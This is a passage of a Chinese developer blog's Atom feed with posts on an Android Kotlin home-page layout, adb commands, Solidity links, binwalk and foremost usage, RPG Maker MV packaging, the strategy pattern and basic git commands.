    <link href="http://tea9.coding.me/2018/09/04/2018-09-04-android_complex_layout1/"/>
    <id>http://tea9.coding.me/2018/09/04/2018-09-04-android_complex_layout1/</id>
    <published>2018-09-03T16:00:00.000Z</published>
    <updated>2018-09-06T03:16:29.255Z</updated>
    
    <content type="html"><![CDATA[<p>示例图<br><img src="!--￼0--&gt;/18/01.png" alt="原型图"></p><p>分析：<br>通过分析原型图，分为4个模块  </p><p>1.轮播图<br>2.公告<br>3.指示器<br>4.内容列表  </p><hr><p>实现：<br>轮播图使用<a href="https://github.com/bingoogolapple/BGABanner-Android" target="_blank" rel="noopener">BGABanner-Android</a>库<br>公告使用ViewFlipper控件<br>指示器切换使用<a href="https://github.com/hackware1993/MagicIndicator" target="_blank" rel="noopener">MagicIndicator</a>库<br>内容列表使用ViewPager+Fragment（RecyclerView）  </p><p><img src="!--￼1--&gt;/18/03.png" alt="实现图"></p><p>其他依赖：  </p><p><a href="https://github.com/Kotlin/anko" target="_blank" rel="noopener">anko</a><br><a href="https://github.com/CymChad/BaseRecyclerViewAdapterHelper" target="_blank" rel="noopener">BaseRecyclerViewAdapterHelper</a><br><a href="https://github.com/bumptech/glide" target="_blank" rel="noopener">glide</a><br><a href="https://github.com/google/gson" target="_blank" rel="noopener">gson</a>  </p><hr><p>源码：<br><a href="https://github.com/tea9/dear_kotlin_code/tree/master/homepage" target="_blank" rel="noopener">homepage</a></p><p>目录结构：<br>activity<br>-HomeViewPagerActivity<br>adapter<br>-ViewPagerAdapter<br>fragment<br>-TabFragment  </p><hr><p>代码：  </p><p>activity_home_viewpager.xml  </p><pre><code>&lt;android.support.design.widget.CoordinatorLayout    xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:layout_width=&quot;match_parent&quot;    android:layout_height=&quot;match_parent&quot;    xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot;    android:id=&quot;@+id/cl_page&quot;&gt;    &lt;android.support.design.widget.AppBarLayout        android:layout_width=&quot;match_parent&quot;        android:layout_height=&quot;wrap_content&quot;        android:fitsSystemWindows=&quot;true&quot;&gt;        &lt;android.support.v7.widget.Toolbar            android:id=&quot;@+id/toolbar&quot;            android:layout_width=&quot;match_parent&quot;            android:layout_height=&quot;wrap_content&quot;            app:contentInsetLeft=&quot;0dp&quot;            app:contentInsetStart=&quot;0dp&quot;            app:layout_scrollFlags=&quot;scroll|enterAlways&quot; &gt;            &lt;include                layout=&quot;@layout/item_banner&quot; /&gt;        &lt;/android.support.v7.widget.Toolbar&gt;        &lt;net.lucode.hackware.magicindicator.MagicIndicator            android:id=&quot;@+id/magic_indicator&quot;            android:layout_width=&quot;match_parent&quot;            android:layout_height=&quot;40dp&quot; /&gt;    &lt;/android.support.design.widget.AppBarLayout&gt;    &lt;LinearLayout        android:layout_width=&quot;match_parent&quot;        android:layout_height=&quot;match_parent&quot;        android:orientation=&quot;vertical&quot;        android:scrollbars=&quot;none&quot;        app:layout_behavior=&quot;@string/appbar_scrolling_view_behavior&quot;&gt;        &lt;android.support.v4.view.ViewPager            android:id=&quot;@+id/view_pager&quot;            android:layout_width=&quot;match_parent&quot;            android:layout_height=&quot;match_parent&quot; /&gt;    &lt;/LinearLayout&gt;&lt;/android.support.design.widget.CoordinatorLayout&gt;</code></pre><p>分析：<br>使用CoordinatorLayout+AppBarLayout+Toolbar实现tab头部依附效果<br><img src="!--￼2--&gt;/18/02.png" alt="列表图"><br>MagicIndicator指示器控件<br>ViewPager指示器滑动切换  </p><hr><p>item_banner.xml  </p><pre><code>&lt;LinearLayout    xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:layout_width=&quot;match_parent&quot;    android:layout_height=&quot;match_parent&quot;    android:orientation=&quot;vertical&quot;    xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot;&gt;    &lt;cn.bingoogolapple.bgabanner.BGABanner        android:id=&quot;@+id/banner&quot;        android:layout_width=&quot;match_parent&quot;        android:layout_height=&quot;180dp&quot;        android:visibility=&quot;visible&quot;        app:banner_pageChangeDuration=&quot;1000&quot;        app:banner_pointAutoPlayAble=&quot;true&quot;        app:banner_pointContainerBackground=&quot;@android:color/transparent&quot;        app:banner_pointDrawable=&quot;@drawable/bga_banner_selector_point_hollow&quot;        app:banner_pointTopBottomMargin=&quot;15dp&quot;        app:banner_transitionEffect=&quot;alpha&quot; /&gt;    &lt;LinearLayout        xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:layout_width=&quot;match_parent&quot;        android:layout_height=&quot;40dp&quot;        android:orientation=&quot;horizontal&quot;        android:gravity=&quot;center_vertical&quot;&gt;        &lt;ImageView            android:layout_width=&quot;15dp&quot;            android:layout_height=&quot;15dp&quot;            android:background=&quot;@mipmap/ic_notice_m&quot;            android:layout_marginStart=&quot;10dp&quot;            android:layout_marginEnd=&quot;10dp&quot;/&gt;        &lt;ViewFlipper            android:id=&quot;@+id/view_flipper&quot;            android:layout_weight=&quot;1&quot;            android:layout_width=&quot;match_parent&quot;            android:layout_height=&quot;25dp&quot;            android:autoStart=&quot;true&quot;            android:layout_gravity=&quot;center_vertical&quot;            android:paddingTop=&quot;2dp&quot;            android:flipInterval=&quot;2000&quot;            android:inAnimation=&quot;@anim/anim_come_in&quot;            android:outAnimation=&quot;@anim/anim_get_out&quot;&gt;        &lt;/ViewFlipper&gt;        &lt;ImageView            android:layout_width=&quot;10dp&quot;            android:layout_height=&quot;10dp&quot;            android:background=&quot;@mipmap/ic_more&quot;            android:layout_marginStart=&quot;10dp&quot;            android:layout_marginEnd=&quot;10dp&quot;/&gt;    &lt;/LinearLayout&gt;&lt;/LinearLayout&gt;</code></pre><p>item_banner.xml实现了轮播图+公告<br><img src="!--￼3--&gt;/18/04.png" alt="轮播图+广告"><br>BGABanner轮播图<br>ViewFlipper公告</p><hr><p>上下滚动动画：  </p><p>anim/anim_come_in.xml</p><pre><code>&lt;set xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;&gt;    &lt;translate        android:fromYDelta=&quot;100%p&quot;        android:toYDelta=&quot;0&quot;        android:duration=&quot;1000&quot;/&gt;&lt;/set&gt;</code></pre><p>anim/anim_get_out.xml</p><pre><code>&lt;set xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;&gt;    &lt;translate        android:fromYDelta=&quot;0&quot;        android:toYDelta=&quot;-100%p&quot;        android:duration=&quot;1000&quot;/&gt;&lt;/set&gt;</code></pre><hr><p>HomeViewPagerActivity.kt  </p><pre><code>class HomeViewPagerActivity :AppCompatActivity() {    var tabList = arrayListOf(&quot;tab1&quot;,&quot;tab2&quot;,&quot;tab3&quot;,&quot;tab4&quot;,&quot;tab5&quot;,&quot;tab6&quot;,&quot;tab7&quot;)    var imgList:ArrayList&lt;String&gt; = arrayListOf(&quot;https://images.unsplash.com/photo-1531026383433-6ed5a112afbc?ixlib=rb-0.3.5&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;s=c010c700aac502636ad0b579ce1274a4&amp;auto=format&amp;fit=crop&amp;w=1650&amp;q=80&quot;,&quot;https://images.unsplash.com/photo-1531075515553-b4d1f75ff534?ixlib=rb-0.3.5&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;s=b3f6b409e70fca36a74369d882e85f49&amp;auto=format&amp;fit=crop&amp;w=1567&amp;q=80&quot;,&quot;https://images.unsplash.com/photo-1531130744926-1d86103aebeb?ixlib=rb-0.3.5&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;s=28f240aae3de685fc4742f09c922f6f8&amp;auto=format&amp;fit=crop&amp;w=1714&amp;q=80&quot;)    var mesList = arrayListOf(&quot;您的公告1&quot;,&quot;您的公告2&quot;,&quot;您的公告3&quot;)    var dataList = arrayListOf&lt;String&gt;(&quot;hhhhhh&quot;,&quot;sssss&quot;,&quot;aaa&quot;,&quot;bbb&quot;,&quot;zzz&quot;,&quot;aaa&quot;,&quot;bbb&quot;,&quot;kkk&quot;,&quot;aaa&quot;,&quot;bbb&quot;,&quot;shaomiao&quot;,&quot;aaa&quot;,&quot;bbb&quot;,&quot;ojj&quot;,&quot;aaa&quot;,&quot;bbb&quot;,&quot;fjkjk&quot;,&quot;aaa&quot;,&quot;bbb&quot;,&quot;dfkdkjk&quot;,&quot;aaa&quot;,&quot;bbb&quot;)    override fun onCreate(savedInstanceState: Bundle?) {        super.onCreate(savedInstanceState)        setContentView(R.layout.activity_home_viewpager)        setSupportActionBar(toolbar)        initBanner()        initViewFlipper()        initViewpager()        initMagicIndicator()    }    fun initBanner() {        banner.setAdapter(BGABanner.Adapter&lt;ImageView,String&gt; { banner, itemView, model, position -&gt;            Glide.with(itemView.context)                    .load(model)                    .apply(RequestOptions().placeholder(R.mipmap.ic_launcher).error(R.mipmap.ic_launcher).dontAnimate().centerCrop())                    .into(itemView)        })        banner.setData(imgList, Arrays.asList(&quot;&quot;,&quot;&quot;,&quot;&quot;))        // 点击事件        banner.setDelegate { banner, itemView, model, position -&gt; toast(model.toString()+position) }    }    fun initViewFlipper() {        for (i in mesList.indices) {            var view = LayoutInflater.from(this).inflate(R.layout.item_textview,null)            view.findViewById&lt;TextView&gt;(R.id.text_view).text = mesList[i]            view.setOnClickListener {                toast(mesList[i]+i)            }            view_flipper.addView(view)        }        view_flipper.isAutoStart = true    }    fun initMagicIndicator() {        var commonNavigator = CommonNavigator(this)        commonNavigator.adapter = object : CommonNavigatorAdapter() {            override fun getCount(): Int {                return  if (tabList == null)0 else tabList.size            }            override fun getTitleView(p0: Context?, p1: Int): IPagerTitleView {                var colorTransitionPagerTitleView = ColorTransitionPagerTitleView(p0)                colorTransitionPagerTitleView.normalColor= ContextCompat.getColor(p0!!,R.color.abc_btn_colored_borderless_text_material)                colorTransitionPagerTitleView.selectedColor = ContextCompat.getColor(p0!!,R.color.abc_btn_colored_borderless_text_material)                colorTransitionPagerTitleView.text = tabList[p1].toUpperCase()                colorTransitionPagerTitleView.setOnClickListener (View.OnClickListener {                    view_pager.currentItem = p1                })                return colorTransitionPagerTitleView            }            override fun getIndicator(p0: Context?): IPagerIndicator {                var indicator: LinePagerIndicator = LinePagerIndicator(p0)                indicator.mode = LinePagerIndicator.MODE_EXACTLY                indicator.setColors(ContextCompat.getColor(p0!!,R.color.abc_btn_colored_borderless_text_material))                return indicator            }        }        magic_indicator.navigator = commonNavigator        ViewPagerHelper.bind(magic_indicator,view_pager)    }    fun initViewpager() {        var adapter = ViewPagerAdapter(supportFragmentManager,tabList, Gson().toJson(dataList))        view_pager.adapter = adapter    }}</code></pre><p>tabList:指示器数据<br>imgList:轮播图数据<br>mesList:公告数据<br>dataList:列表数据  </p><p>initBanner():初始化轮播图<br>initViewFlipper():初始化公告<br>initMagicIndicator():初始化指示器<br>initViewpager():初始化ViewPager  </p><hr><p>ViewPagerAdapter.kt ViewPager适配器  </p><pre><code>class ViewPagerAdapter(fm: FragmentManager?, var tabList:ArrayList&lt;String&gt;, var listStr:Any) : FragmentPagerAdapter(fm){    override fun getItemPosition(`object`: Any): Int {        return PagerAdapter.POSITION_NONE    }    override fun instantiateItem(container: ViewGroup, position: Int): Any {        var fragment :TabFragment = super.instantiateItem(container, position) as TabFragment        fragment.updateArguments(position, listStr.toString())        return fragment    }    override fun getCount(): Int {        return  tabList.size    }    override fun getPageTitle(position: Int): CharSequence? {        return tabList[position]    }    override fun getItem(position: Int): Fragment {        return  TabFragment.create(position, Gson().toJson(listStr))    }    override fun notifyDataSetChanged() {        super.notifyDataSetChanged()    }}</code></pre><hr><p>TabFragment.kt  </p><pre><code>class TabFragment: Fragment(){    var pageType:Int = 0    var data:String = &quot;&quot;    var adapter:BaseQuickAdapter&lt;String,BaseViewHolder&gt;? = null    companion object TabFragment{        fun create(pageType:Int,data:String) : com.example.homepage.fragment.TabFragment {            var f = TabFragment()            var args = Bundle()            args.putInt(&quot;position&quot;,pageType)            args.putString(&quot;data&quot;,data)            f.arguments=args            return f        }    }    override fun onCreate(savedInstanceState: Bundle?) {        super.onCreate(savedInstanceState)        var args: Bundle = arguments!!        if (null!=args) {            pageType = args.getInt(&quot;position&quot;)            data = args.getString(&quot;data&quot;)            Log.e(&quot;shaomiaodata&quot;,data)        }    }    override fun onCreateView(inflater: LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View? {        var view: View = inflater.inflate(R.layout.recycler_view,container,false)        initRecyclerView(view)        return view    }    fun initRecyclerView(view:View) {        var layoutManager = LinearLayoutManager(context)        layoutManager.orientation = OrientationHelper.VERTICAL        var recycler_view = view.findViewById&lt;RecyclerView&gt;(R.id.recycler_view)        recycler_view.layoutManager = layoutManager        recycler_view.addItemDecoration(DividerItemDecoration(context, LinearLayoutManager.VERTICAL))        var list1=  data!!.fromListJson&lt;String&gt;()        adapter = object : BaseQuickAdapter&lt;String,BaseViewHolder&gt;(R.layout.item_layout,list1 as List&lt;String&gt;) {            override fun convert(helper: BaseViewHolder?, item: String?) {                helper!!.setText(R.id.item_tv,item)                helper.addOnClickListener(R.id.item_tv)            }        }        adapter!!.onItemChildClickListener = BaseQuickAdapter.OnItemChildClickListener { adapter, view, position -&gt;            toast(&quot;itemclick&quot;+position)        }        recycler_view.adapter = adapter    }    // 解析json数据    inline fun &lt;reified T&gt; String.fromListJson(charset: Charset = Charset.forName(&quot;UTF-8&quot;)): ArrayList&lt;T&gt;? {        val gson = GsonBuilder().create()        return gson.fromJson&lt;ArrayList&lt;T&gt;&gt;(this.toByteArray(charset).toString(charset),object : TypeToken&lt;ArrayList&lt;T&gt;&gt;(){}.type)    }    fun updateArguments(pageType:Int,data:String) {        this.pageType = pageType        this.data = data        var args: Bundle = arguments!!        if (null!=args) {            args.putInt(&quot;pageType&quot;,pageType)            args.putString(&quot;data&quot;,data)        }    }}</code></pre><hr><p>源码：<br><a href="https://github.com/tea9/dear_kotlin_code/tree/master/homepage" target="_blank" rel="noopener">homepage</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;示例图&lt;br&gt;&lt;img src=&quot;!--￼0--&amp;gt;/18/01.png&quot; alt=&quot;原型图&quot;&gt;&lt;/p&gt;
&lt;p&gt;分析：&lt;br&gt;通过分析原型图，分为4个模块  &lt;/p&gt;
&lt;p&gt;1.轮播图&lt;br&gt;2.公告&lt;br&gt;3.指示器&lt;br&gt;4.内容列表  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;实
      
    
    </summary>
    
      <category term="android" scheme="http://tea9.coding.me/categories/android/"/>
    
    
      <category term="android" scheme="http://tea9.coding.me/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>Android的命令</title>
    <link href="http://tea9.coding.me/2018/08/31/2018-08-31-android_shell/"/>
    <id>http://tea9.coding.me/2018/08/31/2018-08-31-android_shell/</id>
    <published>2018-08-30T16:00:00.000Z</published>
    <updated>2018-08-31T06:09:14.950Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><p><a href="https://blog.csdn.net/yianemail/article/details/51693583" target="_blank" rel="noopener">oh-my-zsh ，“zsh: command not found: adb”解决方法</a></p><pre><code>open .zshrc在# User configuration添加source ~/.bash_profile执行source .zshrc</code></pre><h2 id="关于Android的命令"><a href="#关于Android的命令" class="headerlink" title="关于Android的命令"></a>关于Android的命令</h2><pre><code>更新Android SDK$ adnroid update sdk --no-ui</code></pre><p><strong>ADB</strong><br>adb位于platform-tools文件夹，早期版本在tools文件夹内。  </p><pre><code>列出所有命令adb help all列出所有连接的Android设备和虚拟机adb devices将电脑上的文件复制到设备（通常存到SD卡）adb push &lt;local&gt; &lt;remote&gt;将设备上的文件复制到电脑adb pull &lt;remote&gt; &lt;local&gt;</code></pre><p><strong>ADB和多设备</strong>  </p><pre><code>$ adb devices$ adb -s xxxxx logcat$ adb logcat MyActivity:* *:S // &lt;tag&gt;:&lt;prioroty&gt;  *表示可能的值  AndroidRuntime:*参数 Android系统相关的日志信息以及由平台引起的应用程序异常</code></pre><p><strong>Wi-Fi连接adb</strong>  </p><pre><code>$ adb devicesList of devices attached0000000  device$ adb tcpip 5555$ adb commect 192.168.1.104$ adb devicesList of devices attached192.168.1.104:5555 device</code></pre><p><strong>执行命令</strong>  </p><pre><code>$ adb shell$ adb shell am startservice -a &lt;intent action&gt; // 启动service$ adb shell pm list packages // 列出所有已安装的包</code></pre><p><strong>更多adb命令</strong>  </p><p><a href="http://developer.android.com/tools/help/adb.html" target="_blank" rel="noopener">adb命令</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Tips&quot;&gt;&lt;a href=&quot;#Tips&quot; class=&quot;headerlink&quot; title=&quot;Tips&quot;&gt;&lt;/a&gt;Tips&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/yianemail/article/details/51693
      
    
    </summary>
    
      <category term="Android" scheme="http://tea9.coding.me/categories/Android/"/>
    
    
      <category term="Android" scheme="http://tea9.coding.me/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>智能合约教程</title>
    <link href="http://tea9.coding.me/2018/08/31/2018-08-31-solidity_link/"/>
    <id>http://tea9.coding.me/2018/08/31/2018-08-31-solidity_link/</id>
    <published>2018-08-30T16:00:00.000Z</published>
    <updated>2018-09-16T14:23:54.364Z</updated>
    
    <content type="html"><![CDATA[<h2 id="以太坊的语言-IDE-API"><a href="#以太坊的语言-IDE-API" class="headerlink" title="以太坊的语言/IDE/API"></a>以太坊的语言/IDE/API</h2><p><a href="https://github.com/ethereum/solidity" target="_blank" rel="noopener">solidity github</a>  </p><p><a href="http://remix.ethereum.org/" target="_blank" rel="noopener">在线IDE</a>  </p><p><a href="https://solidity-cn.readthedocs.io/zh/develop/introduction-to-smart-contracts.html" target="_blank" rel="noopener">中文Docs</a>  </p><p><a href="https://www.cnblogs.com/Evsward/p/contract.html" target="_blank" rel="noopener">智能合约-超详细</a>  </p><h2 id="留坑"><a href="#留坑" class="headerlink" title="留坑"></a>留坑</h2><p>IBM Fabric 联盟链 超级账本  </p><p>Hyperledger Fabric   iBM 开源区块链项目  </p><p>Truffle 以太坊 开发框架  　</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;以太坊的语言-IDE-API&quot;&gt;&lt;a href=&quot;#以太坊的语言-IDE-API&quot; class=&quot;headerlink&quot; title=&quot;以太坊的语言/IDE/API&quot;&gt;&lt;/a&gt;以太坊的语言/IDE/API&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://githu
      
    
    </summary>
    
      <category term="区块链" scheme="http://tea9.coding.me/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    
      <category term="区块链 solidity 以太坊" scheme="http://tea9.coding.me/tags/%E5%8C%BA%E5%9D%97%E9%93%BE-solidity-%E4%BB%A5%E5%A4%AA%E5%9D%8A/"/>
    
  </entry>
  
  <entry>
    <title>CTF工具命令</title>
    <link href="http://tea9.coding.me/2018/08/20/2018-08-20-tool_shell/"/>
    <id>http://tea9.coding.me/2018/08/20/2018-08-20-tool_shell/</id>
    <published>2018-08-19T16:00:00.000Z</published>
    <updated>2018-08-31T08:46:05.581Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一些CTF常用工具的命令"><a href="#一些CTF常用工具的命令" class="headerlink" title="一些CTF常用工具的命令"></a>一些CTF常用工具的命令</h1><p>Binwalk是路由器固件分析的必备工具，该工具最大的优点就是可以自动完成指定文件的扫描，智能发掘潜藏在文件中所有可疑的文件类型及文件系统。  </p><pre><code>binwalk xx.png //查看</code></pre><p>Foremost是基于文件开始格式，文件结束标志和内部数据结构进行恢复文件的程序。  </p><pre><code>foremost xx.png //分离</code></pre><p>——-未完待续—————–</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;一些CTF常用工具的命令&quot;&gt;&lt;a href=&quot;#一些CTF常用工具的命令&quot; class=&quot;headerlink&quot; title=&quot;一些CTF常用工具的命令&quot;&gt;&lt;/a&gt;一些CTF常用工具的命令&lt;/h1&gt;&lt;p&gt;Binwalk是路由器固件分析的必备工具，该工具最大的优点就
      
    
    </summary>
    
      <category term="安全" scheme="http://tea9.coding.me/categories/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="安全" scheme="http://tea9.coding.me/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>RPG_Maker_MV-安卓HTML一键打包</title>
    <link href="http://tea9.coding.me/2018/08/15/2018-08-15-rpg_maker_android_package/"/>
    <id>http://tea9.coding.me/2018/08/15/2018-08-15-rpg_maker_android_package/</id>
    <published>2018-08-14T16:00:00.000Z</published>
    <updated>2018-08-15T02:35:31.098Z</updated>
    
    <content type="html"><![CDATA[<h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><p>这个软件是收费的<br>免费版不能修改icon和包名  </p><h2 id="使用html一键打包工具"><a href="#使用html一键打包工具" class="headerlink" title="使用html一键打包工具"></a>使用html一键打包工具</h2><p><a href="http://www.krpano.tech/archives/420" target="_blank" rel="noopener">HTML一键打包APK工具</a>  </p><p><a href="https://pan.baidu.com/s/18zv4O-BD-mWKQYApTj-r4g?errno=0&amp;errmsg=Auth%20Login%20Sucess&amp;&amp;bduss=&amp;ssnerror=0&amp;traceid=" target="_blank" rel="noopener">HTML压缩包</a></p><h2 id="部署项目"><a href="#部署项目" class="headerlink" title="部署项目"></a>部署项目</h2><p>文件-部署-Android/IOS<br><img src="!--￼0--&gt;/16/01.png" alt="打包项目"><br><img src="!--￼1--&gt;/16/03.png" alt="www文件目录"></p><h2 id="使用HTML一键打包工具进行打包"><a href="#使用HTML一键打包工具进行打包" class="headerlink" title="使用HTML一键打包工具进行打包"></a>使用HTML一键打包工具进行打包</h2><p>1.下载HTML一键打包工具<br>2.安装HTML一键打包工具<br>路径选择为www下index.html<br><img src="!--￼2--&gt;/16/02.png" alt="打包配置"></p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>1.文件名不要中文<br>2.项目中不能含有中文的名称</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/u012416063/article/details/81264317" target="_blank" rel="noopener">RPG MAKER MV 打包APK教程(一键打包,无需编写任何代码)</a>  </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;tips&quot;&gt;&lt;a href=&quot;#tips&quot; class=&quot;headerlink&quot; title=&quot;tips&quot;&gt;&lt;/a&gt;tips&lt;/h2&gt;&lt;p&gt;这个软件是收费的&lt;br&gt;免费版不能修改icon和包名  &lt;/p&gt;
&lt;h2 id=&quot;使用html一键打包工具&quot;&gt;&lt;a href
      
    
    </summary>
    
      <category term="RPG_Maker_MV" scheme="http://tea9.coding.me/categories/RPG-Maker-MV/"/>
    
    
      <category term="RPG_Maker_MV" scheme="http://tea9.coding.me/tags/RPG-Maker-MV/"/>
    
  </entry>
  
  <entry>
    <title>设计模式-策略模式（strategy）</title>
    <link href="http://tea9.coding.me/2018/08/10/2018-08-10-design_pattern1/"/>
    <id>http://tea9.coding.me/2018/08/10/2018-08-10-design_pattern1/</id>
    <published>2018-08-09T16:00:00.000Z</published>
    <updated>2018-08-10T06:14:21.878Z</updated>
    
    <content type="html"><![CDATA[<h2 id="策略模式"><a href="#策略模式" class="headerlink" title="策略模式"></a>策略模式</h2><p>视频地址<br><a href="http://www.imooc.com/video/3213" target="_blank" rel="noopener">http://www.imooc.com/video/3213</a></p><p>策略模式  ：  </p><p>将可变的部分  从程序中抽象分离成算法接口在该接口下分别封装一系列的算法实现<br>并使他们可以相互等候，从而导致客户端程序独立于算法的改变。  </p><p>不变更代码架构<br>通过开发与重构<br>拥抱需求的变化<br>使用策略模式  </p><p>虚拟应用：  鸭子应用<br>飞行的能力<br>更多鸭子类型<br>每六个月发布一款产品  </p><p>原有功能  </p><p>鸭子的鸣叫功能<br>鸭子的显示功能  </p><p>需求：<br>加入飞行能力  </p><p>原有项目：<br>鸭子基类<br>Duck.class</p><pre><code>/* * 超类，所有的鸭子都要继承此类 * 抽象了鸭子的行为：显示和鸣叫 */public abstract class Duck {    /*     * 鸭子发出叫声     * 通用行为，由超类实现     */    public void quack(){        System.out.println(&quot;嘎嘎嘎&quot;);    }    /*     * 显示鸭子的外观     * 鸭子的外观各不相同，声明为abstract， 由子类实现     */    public abstract void display();}</code></pre><p>需求:让鸭子飞起来？  </p><p>方案一：继承<br>    在父类中提供实现方法，子类通过继承获得父类中的飞行行为  </p><pre><code>Duck.classpublic void fly(){    System.out.println(&quot;用翅膀飞行&quot;);}</code></pre><p>优点<br>  简单易用(粗暴丑陋)，已用应用可以快速添加飞行的能力<br>缺点<br>  不具有灵活性，对未来变更支持差<br>  需要通过在子类中覆写飞行的方法以提供新的飞行行为。这很容易造成错误(粗心的程序员忘记覆写)。  </p><p>———————————–pass———————————-  </p><p>方案二：抽象方法<br>  在父类中提供抽象方法，强迫子类实现自己的飞行行为  </p><pre><code>public abstract void fly();</code></pre><p>优点<br>  足够灵活。  </p><p>缺点<br>  累死<br>  每个子类都要实现一遍代码，即使是相同的行为也不例外。<br>  代码重复，没有复用代码。  </p><p>————————-pass————————————-  </p><p>######继承是重用代码的利器  </p><p>######但继承并不总是最好的工具  </p><hr><p>#####复合优先于继承</p><p>#####多用组合，少用继承</p><p>组合<br>has-a     </p><p>#use  </p><p>组合：<br> 在类中增加一个私有域，引用另一个已有的类的实例，通过调用引用实例的方法从而获得新的功能，这种设计称作组合(复合)  </p><p>方案三：组合<br>  将飞行行为抽象为接口，在父类中持有该接口，并由该接口代理飞行行为。  </p><pre><code>/* * 策略接口，实现鸭子的飞行行为 */public interface FlyingStragety {    void performFly();}private FlyingStragety flyingStragety;public void setFlyingStragety(FlyingStragety flyingStragety) {    this.flyingStragety = flyingStragety;}public void fly(){    flyingStragety.performFly();}</code></pre><p>优点：<br>  足够灵活<br>  复用代码，更易于维护  </p><p>缺点：  </p><p>策略模式中的设计原则：<br>  找出应用中需要变化的部分，把他们独立出来，不要和那些不需要变化的代码混在一起。<br>  面向接口编程，而不是面向实现编程。<br>  多用组合，少用继承。  </p><p>策略模式的实现：<br>  （1） 通过分离变化得出的策略接口Strategy<br>  （2） Strategy的实现类<br>  （3） 客户程序”有一个”Stategy<br>  （4） 客户程序中选择/组装正确的Strategy实现  </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;策略模式&quot;&gt;&lt;a href=&quot;#策略模式&quot; class=&quot;headerlink&quot; title=&quot;策略模式&quot;&gt;&lt;/a&gt;策略模式&lt;/h2&gt;&lt;p&gt;视频地址&lt;br&gt;&lt;a href=&quot;http://www.imooc.com/video/3213&quot; target=&quot;_bla
      
    
    </summary>
    
      <category term="设计模式" scheme="http://tea9.coding.me/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
    
      <category term="设计模式" scheme="http://tea9.coding.me/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>Git命令行基础</title>
    <link href="http://tea9.coding.me/2018/08/10/2018-08-10-git_base/"/>
    <id>http://tea9.coding.me/2018/08/10/2018-08-10-git_base/</id>
    <published>2018-08-09T16:00:00.000Z</published>
    <updated>2018-08-10T06:10:52.768Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Git命令行基础"><a href="#Git命令行基础" class="headerlink" title="Git命令行基础"></a>Git命令行基础</h2><p>Git是一个开源的分布式版本控制工具</p><p>配置身份</p><p><img src="http://upload-images.jianshu.io/upload_images/2590671-227984aa4a843aea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="配置身份"></p><pre><code>git config --global user.name &quot;Tony&quot;git config --global user.email &quot;tony@gmail.com&quot;</code></pre><p>检查是否配置成功</p><p><img src="http://upload-images.jianshu.io/upload_images/2590671-928c9c6757dc67e0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="检查配置"></p><pre><code>git config --global user.name git config --global user.email</code></pre><p>创建本地代码仓库</p><p><img src="http://upload-images.jianshu.io/upload_images/2590671-e754601d1294c2da.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="创建本地仓库"></p><pre><code>git init</code></pre><p>仓库创建完成后会在项目目录下生成一个隐藏的.git文件夹 这个文件夹就是用来记录本地所有的Git操作的<br>如果你想要删除本地仓库 只需要删除这个文件夹就行</p><p><img src="http://upload-images.jianshu.io/upload_images/2590671-3dff03268e6c368d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git"></p><p>提交本地代码</p><pre><code>git add [提交的文件名] // 提交一个文件 git add . // 提交所有文件</code></pre><p><img src="http://upload-images.jianshu.io/upload_images/2590671-7e2ae3e2d7d6b0ce.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git add"></p><p><img src="http://upload-images.jianshu.io/upload_images/2590671-5a267cd07270af2f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git add ."></p><p>现在所有文件都加好了  然后用commit命令提交下</p><pre><code>git commit -m &quot;First commit.&quot;</code></pre><p>忽略文件</p><p>在项目中创建  .gitignore 文件  </p><p>在.gitignore文件下 每行指定的文件或目录会排除在版本控制外</p><p><img src="http://upload-images.jianshu.io/upload_images/2590671-1fb5b8fd5616d1da.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=".gitignore"></p><p>查看修改内容</p><pre><code>git status</code></pre><p><img src="http://upload-images.jianshu.io/upload_images/2590671-2ce1bd904ae1ed59.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="git status"></p><p>查看更改内容</p><pre><code>git diff</code></pre><p><img 